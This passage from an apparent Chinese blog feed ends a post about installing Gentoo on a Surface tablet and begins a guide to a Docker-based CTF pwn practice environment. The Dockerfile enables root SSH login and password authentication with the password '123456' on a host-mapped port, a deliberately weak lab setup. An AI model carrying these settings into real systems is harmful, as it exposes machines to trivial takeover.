仓库是否启用成功</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask --autounmask app-i18n/fcitx-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dispatch-conf <span class="hljs-comment"># 这里直接 u 就好</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-i18n/fcitx-meta app-i18n/fcitx-chinese-addons</span><br></code></pre></td></tr></table></figure><p>最后按惯例在设置的 <code>virtual keyboard</code> 里选中 <code>fcitx5</code> ，然后右键 panel 的小企鹅图标找 <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2024/05/08/Fau4LnKdUomslJY.jpg" alt="image.png"></p><blockquote><p>笔者不得不吐槽的一句是软件包非常老，在各大主流发行版 <code>fcitx5</code> 早已全面铺开的时代，Gentoo 这边刚刚上到 rc 版本，同时 <code>cloudpinyin</code> 和 <code>libpinyin</code> 都还停留在 fcitx4 …不过这可能也是相当多开源社区存在的问题了，维护人员越来越少+用户出走逐渐形成恶性循环，马太效应诚不我欺.jpg</p></blockquote><h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><blockquote><p>因为笔者没有协议洁癖所以前面设置了接受所有协议，如果你有但是又需要安装部分软件则需要参照 wiki 手动修改 <code>/etc/portage/package.license</code> ：）</p></blockquote><p>首先是 chrome，有社区从 deb 重新打的包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask www-client/google-chrome</span><br></code></pre></td></tr></table></figure><p>以及 vscode：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-editors/vscode</span><br></code></pre></td></tr></table></figure><p>flatpak 用以补充一些 Gentoo 上没有的软件包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask sys-apps/flatpak</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br></code></pre></td></tr></table></figure><p>然后是中国大陆这边常用的微信，虽然官方 Linux 版特供 UOS、OpenKylin 等国产发行版，但<a href="https://github.com/web1n/wechat-universal-flatpak">有人打了一个绕过发行版检测的 flatpak 的包</a> ，所以直接而下载后安装即可：</p><blockquote><p>flathub 上也有，不过版本稍老</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.tencent.WeChat.flatpak</span><br></code></pre></td></tr></table></figure><p>QQ Linux 版提供了 AppImage 可用，不过还需要提前安个依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-crypt/mit-krb5</span><br></code></pre></td></tr></table></figure><p>之后随便放到个目录里然后写个 shortcut 放到 <code>~/.local/share/applications</code> 下就行：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=QQ<br><span class="hljs-attr">GenericName</span>=Tencent QQ<br><span class="hljs-attr">Exec</span>=/home/arttnba3/Applications/QQ/QQ_3.<span class="hljs-number">2.7</span>_240422_x<span class="hljs-number">86_64_01</span>.appimage<br><span class="hljs-attr">Version</span>=<span class="hljs-number">3.2</span>.<span class="hljs-number">7.240422</span><br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">Categories</span>=Network<span class="hljs-comment">;</span><br><span class="hljs-attr">Terminal</span>=<span class="hljs-literal">false</span><br><span class="hljs-attr">Icon</span>=com.qq.QQ<br></code></pre></td></tr></table></figure><h1 id="0x03-遇到的一些问题"><a href="#0x03-遇到的一些问题" class="headerlink" title="0x03. 遇到的一些问题"></a>0x03. 遇到的一些问题</h1><h2 id="触摸板驱动问题（not-solved）"><a href="#触摸板驱动问题（not-solved）" class="headerlink" title="触摸板驱动问题（not solved）"></a>触摸板驱动问题（not solved）</h2><p>主要表现：</p><ul><li>启动后点按有效，但是多指手势（如双指&#x3D;&#x3D;右键）无效</li><li>按下触摸板左右键后<strong>点按失效</strong></li><li>在 KDE 系统设置中无法检测到触摸板</li></ul><p>基本上只能当作一个最简陋的触摸板来用，笔者最初感觉主要可能是微软触摸板缺少驱动的问题，毕竟在安装 Windows 时在没更新驱动前也没法用键盘和触摸板（ <del>微软怎么天天搞特殊，忍不了一点，真的有必要🐴</del> ）</p><p><strong>但是，笔者在 openSUSE Tumbleweed on Surface 中可以正常使用触摸板及多指手势</strong> ，那这就有意思了，这么看起来似乎是笔者在编译内核时并未将部分必须的驱动给编译进去，又或是没有安装部分必须的软件，笔者更倾向于前者的缘故🤔</p><h2 id="摄像头无法使用（not-solved）"><a href="#摄像头无法使用（not-solved）" class="headerlink" title="摄像头无法使用（not solved）"></a>摄像头无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>这就是你 Surface Pro 的屏摄像头啊，你们有没有这样的摄像头啊，真是摄摄像像又头头啊</del></p><h2 id="休眠无法正常唤醒"><a href="#休眠无法正常唤醒" class="headerlink" title="休眠无法正常唤醒"></a>休眠无法正常唤醒</h2><p>放个一会整个💻就睡死了，按键盘没法唤醒，最快的解决方案是把键盘拔了再重新插上， <del>这就是你 Surface Pro 的键盘啊，你们有没有这样的键盘啊，真是键键又盘盘啊</del></p><h2 id="Surface-Pen-无法使用（not-solved）"><a href="#Surface-Pen-无法使用（not-solved）" class="headerlink" title="Surface Pen 无法使用（not solved）"></a>Surface Pen 无法使用（not solved）</h2><p>应该也是经典的缺驱动问题， <del>不过真的有人会有在 Linux on Surface 上使用 Surface Pen 的需求🐴</del></p><h2 id="触屏无法正常使用（not-solved）"><a href="#触屏无法正常使用（not-solved）" class="headerlink" title="触屏无法正常使用（not solved）"></a>触屏无法正常使用（not solved）</h2><p>应该也是经典的缺驱动问题，Surface Pro 支持十点触控的高素质屏幕几乎成了摆设， <del>这就是你 Surface Pro 的屏幕啊，你们有没有这样的屏幕啊，真是屏屏又幕幕啊</del></p><h1 id="0xFF-写在结束之后…"><a href="#0xFF-写在结束之后…" class="headerlink" title="0xFF. 写在结束之后…"></a>0xFF. 写在结束之后…</h1><p>Distro hopping 的狂欢之火燃尽之后，剩下的似乎总是只有一地的灰烬，在笔者看来 <strong>Gentoo Linux 在安装流程上其实和 Arch Linux 基本差不多</strong>，所以对于笔者而言还是比较轻车熟路的，但在尝试了几小时 Gentoo Linux 后，笔者最终还是选择重新装回 openSUSE Tumbleweed，触摸板一开始就是正常可用的，也没有休眠醒不来的问题，甚至触屏功能在安装了社区提供的 <a href="https://github.com/linux-surface/linux-surface">linux-surface</a> 包之后也正常可用了，唯一的遗憾就是 Surface Pen 与摄像头依旧没法工作，但其他的一切就像你在 Surface 上使用 Windows 那样自然与舒适</p><p><img src="https://s2.loli.net/2024/05/09/dnEDHtBzY7oOxCf.jpg" alt="舒舒又适适，但可惜的是电池健康在经历笔者大四一年的蹂躏之后已经只剩不到 90 了"></p><p>在回到了大蜥蜴温暖的怀抱当中后，笔者不禁思考：究竟是 Surface 这一特殊设备与 Gentoo 八字不合，还是笔者与 Gentoo Linux 在相性上不符呢？笔者自然不希望答案会是后者，但当笔者尝试在另一台旧笔记本上安装 Gentoo Linux 并再次碰到各种问题（例如 Dolphin 和触摸板无法正常工作）时，<strong>笔者不得不承认或许 Gentoo 这个特殊的发行版与笔者在某种程度上有点犯冲</strong>，而这样的两段安装经历也让笔者彻底打消了将主力操作系统从 openSUSE Tumbleweed 换成 Gentoo 的念头</p><p>除此之外，Gentoo 的各种优点似乎也没有理想中的那么好，作为一个滚动发行版，Gentoo 明显是没有 Arch、openSUSE Tumbleweed、Fedora 这样紧贴上游的（当然，如果能实现所谓“调试好了再发布”，那在能确保稳定性的情况下软件包旧一点其实无所谓，但事实上他们似乎并没有能做到这一点）； <code>USE flag</code> 等配置听起来舒服，但是大部分情况下其实并不需要这样的特性，和其他发行版的包管理器的使用体验拉不开差距（当然，大部分情况下一个包管理器又能想要多不一样的体验呢？）；Gentoo wiki 以前一直都被吹嘘能和 Arch wiki 有得一拼，但真正用起来能清晰感受到在内容上前者很明显差了后者好几个档次……</p><p>但这些其实都是小问题，毕竟 Linux 用户和苹果用户一样有着非常强的自适应性，尤其是在使用 Arch&#x2F;Gentoo 这样的高度自定义的发行版的时候，出现问题了大家总会第一时间自适应地认为“是不是自己什么地方没有配置好”，可惜 Gentoo 社区一直在走下坡路却是一个不争的事实，虽然 Gentoo 听起来似乎有着各式各样不同的优点，但使用的人数确乎一直在慢慢减少，也很少有新鲜血液加入，因此很多软件包也没人打，在论坛问问题也没人回复，这又导致没人愿意继续用 Gentoo ——对于 Gentoo 社区所遇到的“马太效应“的问题，笔者思考了许久，感觉似乎没有一个比较好的解决方案，而这似乎是所有规模比较小的发行版都会遇到的问题，发行版用的人少导致社区缺少人维护从而导致系统没有那么好用，系统可用性的降低又使得人员出走，最后“强者愈强，弱者愈弱”</p><p>——而对于这个不得不被正视的问题，<strong>社区除了等死以外似乎并没有什么能做的事情</strong>，但同样是支持高度定制的系统，Gentoo 和 Arch 的命运为什么差得越来越多了呢？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;省流：最后装回了 openSUSE Tumbleweed&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Gentoo Linux" scheme="https://arttnba3.github.io/tags/Gentoo-Linux/"/>
    
  </entry>
  
  <entry>
    <title>【PWN.0x03】Linux x86 用户态 Pwn 基本环境搭建</title>
    <link href="https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/"/>
    <id>https://arttnba3.github.io/2024/03/31/PWN-0X03-USERMODE-ENV/</id>
    <published>2024-03-31T04:21:45.000Z</published>
    <updated>2024-05-14T17:08:45.995Z</updated>
    
    <content type="html"><![CDATA[<p>信 Docker ，得永生</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-wiki</a> 上 Linux 用户态 Pwn 环境搭建的部分 Wiki 组咕了好久了， <em>作为 Pwn 模块默认的第一个页面，一直空着总归不是那么地雅观</em> ，因此作为 Wiki 组为数不多的活人（虽然也只是半个活死人罢了， <del>问就是 Wiki 组包括笔者在内的全员都在和牢大打复活赛</del> ），笔者决定还是找个时间给这一块补充上</p><p>虽然笔者已经很久很久很久没有正经做过用户态 Pwn 了，不过如果只是基础的常规题型的话，需要的工具其实基本上是万年不变的，因此笔者找了个时间（ <del>其实就是在实验室偷偷摸鱼</del> ）给这块内容稍微补充了一下，顺便水一篇博客这样子（ <del>因为太忙 + 太懒实在是没写东西，简单混点更新</del> ）</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>现有的 CTF Pwn 题主要以 Linux 下的用户态 Pwn 为主，因此我们通常需要在本地拥有一个 Linux 运行环境，这通常可以通过安装 Linux 虚拟机来完成，此外你也可以在物理机上安装 Linux 操作系统。</p><p>绝大多数 Linux Pwn 题目的远程环境以 <a href="https://ubuntu.com/">Ubuntu</a> 为主，因此为了方便在本地调试题目，你通常需要搭建一个与题目版本相匹配的 Ubuntu 运行环境，不过 <em>这并不意味着你必须要使用 Ubuntu 作为你的主力操作系统</em> 。你仍旧可以选择继续使用你喜欢的其他 Linux 发行版（如，Arch、Debian、openSUSE、Fedora、NixOS 等），并使用 Docker 来搭建相应的 Ubuntu 做题环境。</p><p>传统 CTF Pwn 题目通常仅需要以下工具便能完成解题：</p><ul><li>IDA：用于对题目进行逆向分析。</li><li>Python + pwntools：用于编写漏洞利用脚本。</li><li>gdb + pwndbg&#x2F;peda：用于调试题目二进制文件。</li></ul><p>需要注意的是，在初学阶段我们并不推荐任何基于 pwntools 进行过度二次包装的软件包，也不推荐你在利用脚本中使用 lambda 语句进行过度简化，我们更推荐你在学习到一定程度后再去根据个人使用习惯进行决定。</p><p>此外，部分题目可能需要一些额外的环境（例如 kernel pwn 需要 qemu），我们将在后续介绍到对应题目时单独进行介绍。</p><h1 id="0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）"><a href="#0x01-使用-Docker-搭建-CTF-Pwn-做题环境（推荐）" class="headerlink" title="0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）"></a>0x01. 使用 Docker 搭建 CTF Pwn 做题环境（推荐）</h1><p>为了保证利用脚本能够正常打通，我们通常需要在本地准备相同的运行环境，并在进行远程利用之前先在本地进行测试，但由于 CTF 题目远程环境众多，若是为每个不同的环境都单独准备一个 Ubuntu 虚拟机，则不仅要在每个虚拟机上都完整搭建一遍调试环境，且会占用大量磁盘空间，同时也无法保证本地环境小版本和远程环境一定相同——除非每个小版本都单独创建一个虚拟机并永不升级，这种解决方案并不优雅。</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 预先加载 libc 在某些程度上是一个可行的解决方案，在 libc 大版本相同的情况下载入不同的小版本通常并不会出现问题，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则可能出现 segmentation fault，从而导致无法正常运行与调试题目。</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过重新开辟一个对应的新的用户环境的方式—— 即形如 Docker 这样的操作系统层上的虚拟化方案，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境。</p><h2 id="Docker-环境搭建"><a href="#Docker-环境搭建" class="headerlink" title="Docker 环境搭建"></a>Docker 环境搭建</h2><p>Docker 的安装请大家根据自己所使用的 Linux 发行版自行参照 <a href="https://docs.docker.com/engine/install/">Docker 官网</a> 或是发行版自己的 Wiki 进行配置，这里不再赘叙。</p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>我们以以下 Dockerfile 所创建的镜像作为模板，大家可以根据自己的需求自行修改：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe \</span><br><span class="language-bash">    LibcSearcher</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>在一个空白文件夹中创建一个名为 <code>Dockerfile</code> 的文件，并写入上述内容，随后运行如下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu22 .</span><br></code></pre></td></tr></table></figure><p>完成之后你便拥有了一个名为 <code>pwnenv_ubuntu22</code> 的带有做题环境的 Ubuntu22 镜像，可以通过 <code>docker images</code> 指令查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span>                                              <br>REPOSITORY               TAG         IMAGE ID       CREATED          SIZE                                     <br>pwnenv_ubuntu22          latest      c129ca086a72   15 seconds ago   2.81GB<br></code></pre></td></tr></table></figure><p>你也可以根据需求修改第一行的基镜像，从而创建基于不同 Ubuntu 发行版的 docker 镜像。</p><h2 id="从-Docker-镜像创建容器"><a href="#从-Docker-镜像创建容器" class="headerlink" title="从 Docker 镜像创建容器"></a>从 Docker 镜像创建容器</h2><p>我们只需要运行如下命令便能基于我们刚刚创建的 Docker 镜像创建一个新的容器，方便起见你可以将其创建为一个脚本，各参数说明如下：</p><ul><li><code>-d</code>： 使容器在后台运行</li><li><code>-p 25000:2222</code>： 容器的 <code>22</code> 端口映射到本地的 <code>25000</code> 端口</li><li><code>--name=pwn22</code>： 容器名为 <code>pwn22</code></li><li><code>-v ~/Desktop/CTF:/CTF</code> ： 将本地的 <code>~/Desktop/CTF</code> 目录映射到容器中的 <code>/CTF</code> 目录，这样我们便能在容器内访问到本地文件，而无需将文件重复拷贝进容器中</li><li><code>pwnenv_ubuntu22</code>：创建容器所使用的镜像</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p 25000:22 \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后通过如下命令便能进入到容器当中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -w /CTF -e TERM=xterm-256color -it pwn22 bash</span><br></code></pre></td></tr></table></figure><p>如果你不想将本地目录与容器进行共享，而是想要将所需文件拷贝一份到容器中，则可以使用 docker cp 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 本地源文件路径 容器名:容器内目的路径</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> 容器名:容器内源文件路径 本地目的路径</span><br></code></pre></td></tr></table></figure><p>由于我们为容器设置了 ssh 服务，我们也可以通过 ssh 连接入容器环境，这允许我们使用 vscode 等工具连接到容器内部：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh root@localhost -p 25000</span><br></code></pre></td></tr></table></figure><p>若是容器环境被我们折腾坏了，则可以直接通过 <code>docker rm 容器名</code> 进行删除，之后再重新使用 <code>docker run</code> 创建新容器即可，需要注意的是这种方式会将新拷贝进容器的文件给删除（但不会删除挂载目录）。</p><h2 id="将-Docker-容器接入本地图形界面"><a href="#将-Docker-容器接入本地图形界面" class="headerlink" title="将 Docker 容器接入本地图形界面"></a>将 Docker 容器接入本地图形界面</h2><p>pwntools 自带的调试命令 <code>gdb.attach()</code> 需要创建新的窗口，而在容器中直接运行会失败，因此我们需要为容器接入本地的图形服务，以达成原生的运行效果（直接弹出一个新的窗口）。</p><blockquote><p>若是觉得这种办法比较麻烦，也可以选择使用 tmux 配置多窗口，只需在运行 <code>gdb.attach()</code> 命令前运行 <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code> 即可。</p></blockquote><h3 id="For-Wayland"><a href="#For-Wayland" class="headerlink" title="For Wayland"></a>For Wayland</h3><p>对于 Wayland 环境，在创建容器时我们需要额外附加一些参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    -e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><h3 id="For-X11"><a href="#For-X11" class="headerlink" title="For X11"></a>For X11</h3><p>对于使用 X11 图形服务的，在创建容器时我们则需要附加如下参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>之后在运行 <code>gdb.attach()</code> 之前运行如下 python 语句之一进行配置即可，请根据自己所使用的桌面环境进行选择。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span 